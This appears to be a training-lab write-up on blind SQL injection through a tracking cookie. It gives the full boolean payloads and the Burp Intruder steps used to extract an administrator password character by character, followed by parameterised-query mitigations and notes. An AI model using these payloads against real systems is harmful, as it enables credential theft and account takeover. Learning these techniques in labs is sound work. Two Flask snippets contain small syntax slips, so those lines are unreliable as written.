# Blind SQL Injection with Conditional Responses

## Goal:
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

## Process

### 1. Intercepted the GET Request and Sent to Repeater (using Burp Suite)
```http
GET /filter?category=Pets HTTP/2
```

### 2. Modified Tracking ID to Test Boolean Conditions

**Injected Payload 1:**
```sql
' AND '1'='1
```

This returned a "Welcome back" message.

**If the backend SQL query is:**
```SQL
SELECT * FROM tracking WHERE id = 'abc123';
```

**After injection, the Tracking ID becomes:**
```http
Cookie: TrackingId=abc123' AND '1'='1;
```

**The resulting backend SQL query becomes:**
```sql
SELECT * FROM tracking WHERE id = 'abc123' AND '1'='1';
```

Since the injected expression `'1'='1'` is always true, the query executes successfully. No comment sequence (`--`) is needed because:
- The injected value is already inside a string literal.
- The rest of the query continues cleanly after the injection.

**Injected Payload 2:**
```sql
' AND '1'='2
```

**The Tracking ID becomes:**
```
Cookie: TrackingId=<ID>' AND '1'='2;
```
This did not return a "Welcome back" message. This confirms that the query behaviour changes based on boolean condition in the injected payload — which means the SQL injection is working and the application is vulnerable to blind SQL injection.

### 3. Verified the Existence of the `users` Table

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

This returned a "Welcome back" message, confirming that a table named `users` exists.

`LIMIT 1` ensures that the subquery returns exactly one row.

Without LIMIT, `' AND (SELECT 'a' FROM users)='a` the subquery may return multiple rows, which causes an error (will not return the "Welcome back" message). SQL doesn't allow a **scalar subquery** (one used in a comparison like = 'a') to return multiple rows.

### 4. Verified the `administrator` Username

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

This returned a "Welcome back" message, confirming there is a user named `administrator`.

### 5. Determined the Password Length and Sent to Intruder

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Tried increasing values to identify the password length until the query returned a "Welcome back" message:

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
```

This confirmed that the password length is 20.

### 6. Retrieved the Password Using Intruder (Sniper Attack)

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

Explanation:

- `SUBSTRING(string_expression, start_position, length)` is a SQL function used to extract part of a string.
- `password` is the string to extract from.
- Start at position `1` (SQL uses 1-based indexing).
- Extract `1` character.
So this returns the first character of the password field.

In Burp Intruder, select `a` and click the **Add §** button:

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
```
`§a§` is replaced with each character from the payload list.

Payload tab configuration:
Payload type: simple list
Payload set: a-z and 0-9 (assuming no uppercase letters)

In the Grep-Match tab (from Settings), search for the value `Welcome back`.

Start the Sniper attack.

This returned a "Welcome back" message only for character `m`, indicating that `m` is the first character of the password.

![burpsuite response](./misc-images/09-1.png)

Repeated the process for the second character:
```sql
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§`
```

This returned a "Welcome back" message only for character `i`, indicating that `i` is the second character.

Repeated the process for all 20 characters and successfully retrieved the complete password.

Logged in as the administrator using the retrieved password.

---

## Mitigation

- Use parameterised queries (prepped statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.

Insecure code (Python):
```py
tracking_id = request.cookies.get['TrackingId']
query = "SELECT * FROM tracking WHERE id = '" + tracking_id + "'"
cursor.execute(query)  # Vulnerable to SQL injection
```

Safe version using prepared statements (Python sqlite3):
```py
query = "SELECT * FROM tracking WHERE id = ?"
cursor.execute(query, (tracking_id,))
```

`?` is a parameter placeholder. It tells the database, "Expect a value here." The value is safely passed as a separate argument to `cursor.execute()`. This prevents it from being executed as SQL. Some DBs like MySQL or Oracle use `%s` or `$1` instead. Click [here](./01-sqli-where-clause.md#notes) for more info.

- Restrict database permissions: The application should connect using a low-privilege database account with access only to the necessary tables and operations. It should not have access to sensitive operations like `SELECT * FROM users`, `DROP`, `UPDATE`, `CREATE`, etc., unless absolutely required.

---

## Reflection

Learned how blind SQL injection can be used to extract data character-by-character using conditional responses and boolean logic.

---

## Notes

1. Testing with `'` and `''` helps determine whether input is placed within a SQL string and if it's properly escaped. Testing `'` and `''`, both not give a "Welcome back" message.

2. In GET/POST parameter injection, your input often breaks the SQL query unless it's followed by a comment sequence (`--` or `#`) to ignore the rest of the query.

3. In Cookie-based injection (like TrackingId), the input may already be inside a quoted string, so no comment is needed.

Example:
A payload like `' AND '1'='1` works in Tracking ID because the injection point is within a **SQL string literal**. The backend query likely includes quotes already, so your input completes the expression cleanly. Adding or mismatching quotes might instead break the query.

4. A Tracking ID is typically used for:
- Analytics (e.g., counting visits)
- A/B testing or content personalization
- Logging user activity or session tracking on the server
It’s a way to identify users or sessions without authentication, often stored in cookies.

5. `request.cookies` is a dictionary-like object in Flask. `tracking_id = request.cookies('TrackingId')` can raise `KeyError` if cookie is missing.	

Use `tracking_id = request.cookies.get('TrackingId', '')` instead.

This says:
- "Try to get the cookie called 'TrackingId', but if it’s missing, just give me an empty string ('') instead — and don’t crash."
- The `.get()` method is like asking nicely and giving it a backup plan.

If your app crashes with an error like `KeyError`, it can:
- Expose internal details (like error messages) → which attackers can use.
- Disrupt user sessions or behavior.
- Cause denial of service if attackers flood the app with invalid inputs.

6. `tracking_id = request.cookies.get('TrackingId')` is also safe, if you handle `None` correctly later in your code.

Example:
```py
tracking_id = request.cookies.get('TrackingId')
if tracking_id is None:
    tracking_id = 'default'
```